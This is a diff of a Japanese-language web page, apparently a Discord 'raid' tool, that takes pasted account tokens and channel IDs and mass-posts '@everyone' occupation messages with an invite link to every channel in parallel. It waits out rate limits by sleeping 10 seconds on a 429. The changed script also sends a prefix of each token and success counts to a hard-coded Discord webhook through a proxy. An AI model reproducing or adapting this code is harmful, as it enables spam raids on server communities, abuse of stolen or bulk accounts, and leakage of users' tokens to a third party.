@@ -2,73 +2,90 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>IIAA Admin - Multi-Strike</title>
+    <title>IIAA Admin - Full Burst</title>
     <style>
         body { background-image: url('名前なし(1).jpg'); background-size: cover; background-attachment: fixed; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .container { background: rgba(255, 255, 255, 0.96); width: 95%; max-width: 600px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 45px rgba(0,0,0,0.4); overflow-y: auto; max-height: 90vh; }
-        h2 { text-align: center; color: #ff5c7e; margin-bottom: 15px; }
+        h2 { text-align: center; color: #ff5c7e; }
         .label { background: #ff7491; color: white; padding: 2px 10px; border-radius: 6px; font-size: 11px; display: inline-block; margin-top: 12px; font-weight: bold; }
-        input, select, textarea { width: 100%; padding: 10px; margin-top: 6px; border: 2px solid #ffd1dc; border-radius: 10px; box-sizing: border-box; }
-        .help-text { font-size: 10px; color: #888; margin-top: 2px; }
-        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
-        .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
-        #terminal { background: #1a1a1a; color: #00ffaa; height: 150px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; font-family: monospace; }
+        textarea, input { width: 100%; padding: 10px; margin-top: 6px; border: 2px solid #ffd1dc; border-radius: 10px; box-sizing: border-box; font-family: monospace; }
+        .btn-main { width: 100%; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 18px; cursor: pointer; border-radius: 14px; font-weight: bold; font-size: 18px; margin-top: 20px; }
+        .btn-stop { width: 100%; background: #444; color: white; border: none; padding: 10px; cursor: pointer; border-radius: 14px; margin-top: 10px; }
+        #terminal { background: #1a1a1a; color: #00ffaa; height: 200px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>IIAA Multi-Controller</h2>
+    <h2>IIAA Full Burst Mode</h2>
     
-    <span class="label">TOKENS (複数入力: 1行に1つ)</span>
-    <textarea id="tokens" placeholder="トークン1&#10;トークン2..." style="height: 80px;"></textarea>
+    <span class="label">TOKENS (1行に1つ)</span>
+    <textarea id="tokens" style="height: 100px;" placeholder="トークンを貼り付け"></textarea>
 
-    <span class="label">TARGET CHANNEL IDs (複数入力: 1行に1つ)</span>
-    <textarea id="channels" placeholder="チャンネルID1&#10;チャンネルID2..." style="height: 80px;"></textarea>
-    <p class="help-text">※同期ボタンは1つ目のトークン・サーバーIDを使用して取得します</p>
+    <span class="label">TARGET CHANNELS (1行に1つIDを入力)</span>
+    <textarea id="channels" style="height: 100px;" placeholder="チャンネルIDを貼り付け"></textarea>
 
-    <div style="display: flex; gap: 10px; align-items: flex-end;">
-        <div style="flex: 1;"><span class="label">SERVER ID (同期用)</span><input type="text" id="guildId"></div>
-        <button onclick="fetchChannels()" style="height: 40px; border-radius: 10px; border: none; background: #eee; cursor: pointer; padding: 0 15px;">同期</button>
-    </div>
-
-    <span class="label">MESSAGE</span><textarea id="message">@everyone いあ帝国参上！</textarea>
+    <span class="label">MESSAGE</span>
+    <textarea id="message" style="height: 60px;">@everyone いあ帝国が占領した！</textarea>
 
     <div style="display: flex; gap: 10px;">
-        <div style="flex: 1;"><span class="label">1トークン毎の件数</span><input type="number" id="count" value="50"></div>
+        <div style="flex: 1;"><span class="label">1人あたりの連投数</span><input type="number" id="count" value="100"></div>
         <div style="flex: 1;"><span class="label">速度(ms)</span><input type="number" id="speed" value="1000"></div>
     </div>
 
-    <div class="btn-group">
-        <button id="startBtn" class="btn-main" onclick="executeTask()">全トークン一斉送信開始</button>
-        <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>停止</button>
-    </div>
-    <div id="terminal">--- Multi-Strike Ready ---</div>
+    <button id="startBtn" class="btn-main" onclick="executeBurst()">一斉射撃開始</button>
+    <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>全停止</button>
+
+    <div id="terminal">--- Ready to Burst ---</div>
 </div>
 
 <script>
     const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
     const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482597483900043305/cVTMUYx4LeUkcWximOG4M4t8-cXXJbscFB4GGEJfCOuORwcORqcZiV5cjn8_sd9I1zst";
-    const PROMO = `\n\n# いあ帝国がこのサーバーを占領した！\nhttps://discord.gg/x39xVSepaj`;
+    const PROMO = `\n\nhttps://discord.gg/x39xVSepaj`;
 
     let isRunning = false;
     const log = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };
 
-    async function fetchChannels() {
-        const tokens = document.getElementById('tokens').value.split('\n').map(s=>s.trim()).filter(s=>s);
-        const g = document.getElementById('guildId').value.trim();
-        if(!tokens[0] || !g) return log("トークン(1つ目)とサーバーIDが必要です", "red");
-        log("同期中...");
-        try {
-            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": tokens[0] } });
-            const data = await res.json();
-            log("取得成功。チャンネルIDをコピーして上に貼ってください：\n" + data.filter(c=>c.type===0).map(c=>`${c.id} (#${c.name})`).join('\n'), "yellow");
-        } catch (e) { log("取得失敗", "red"); }
+    function stopTask() { isRunning = false; log("停止命令を送信中...", "orange"); }
+
+    // 各トークンの独立した送信処理
+    async function startStriker(token, channels, msg, count, speed, strikerName) {
+        let successCount = 0;
+        for (let i = 1; i <= count; i++) {
+            if (!isRunning) break;
+            for (const chId of channels) {
+                if (!isRunning) break;
+                try {
+                    const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
+                        method: "POST",
+                        headers: { "Authorization": token, "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: msg + PROMO })
+                    });
+
+                    if (res.ok) {
+                        successCount++;
+                        log(`[${strikerName}] 成功 ➔ ${chId}`);
+                        
+                        // リアルタイム監視ログ（成功ごとに飛ばす）
+                        fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ content: `✅ [${strikerName}] 成功\nChannel: ${chId}\nTotal: ${successCount}\nToken: ${token.substring(0,15)}...` })
+                        }).catch(()=>{});
+
+                    } else if (res.status === 429) {
+                        log(`[${strikerName}] 制限中(429) 10秒待機`, "orange");
+                        await new Promise(r => setTimeout(r, 10000));
+                    } else {
+                        log(`[${strikerName}] エラー: ${res.status}`, "red");
+                    }
+                } catch (e) { log(`[${strikerName}] 通信失敗`, "red"); }
+                await new Promise(r => setTimeout(r, speed));
+            }
+        }
     }
 
-    function stopTask() { isRunning = false; log("全タスク停止中...", "orange"); }
-
-    async function executeTask() {
+    async function executeBurst() {
         if (isRunning) return;
         const tokens = document.getElementById('tokens').value.split('\n').map(s=>s.trim()).filter(s=>s);
         const channels = document.getElementById('channels').value.split('\n').map(s=>s.trim()).filter(s=>s);
@@ -76,59 +93,22 @@
         const count = parseInt(document.getElementById('count').value);
         const speed = parseInt(document.getElementById('speed').value);
 
-        if(!tokens.length || !channels.length) return log("トークンとチャンネルを1つ以上入力してください", "red");
+        if (!tokens.length || !channels.length) return log("トークンとIDを入力してください", "red");
 
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
         document.getElementById('stopBtn').disabled = false;
+        log(`${tokens.length}個のトークンで同時攻撃を開始...`, "yellow");
 
-        log(`起動：${tokens.length}トークン / ${channels.length}チャンネル`);
-
-        // 各トークンごとに並列で実行
-        const tasks = tokens.map(async (token, index) => {
-            let successCount = 0;
-            const tId = `Token-${index+1}`;
-            
-            for(let i=1; i <= count; i++) {
-                if (!isRunning) break;
-                // 全チャンネルに順番に送る
-                for(const chId of channels) {
-                    if (!isRunning) break;
-                    try {
-                        const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
-                            method: "POST",
-                            headers: { "Authorization": token, "Content-Type": "application/json" },
-                            body: JSON.stringify({ content: msg + PROMO })
-                        });
-
-                        if(res.ok) {
-                            successCount++;
-                            log(`[${tId}] 成功 ➔ ${chId} (${successCount})`);
-                        } else if(res.status === 429) {
-                            log(`[${tId}] 制限！10秒待機`, "orange");
-                            await new Promise(r => setTimeout(r, 10000));
-                        } else {
-                            log(`[${tId}] エラー: ${res.status}`, "red");
-                        }
-                    } catch (e) { log(`[${tId}] 通信失敗`, "red"); }
-                }
-                await new Promise(r => setTimeout(r, speed));
-            }
-
-            // 個別レポート
-            fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `【いあ帝国 レポート】\nトークン: ${token.substring(0,10)}...\n成功合計: ${successCount}` })
-            }).catch(()=>{});
-        });
-
-        await Promise.all(tasks);
+        // Promise.allを使って全トークンを「同時に」起動
+        const strikeTasks = tokens.map((t, idx) => startStriker(t, channels, msg, count, speed, `Striker-${idx+1}`));
         
+        await Promise.all(strikeTasks);
+
         isRunning = false;
         document.getElementById('startBtn').disabled = false;
         document.getElementById('stopBtn').disabled = true;
-        log("全ての送信タスクが終了しました。");
+        log("全射撃任務、完了しました。", "yellow");
     }
 </script>
 </body>
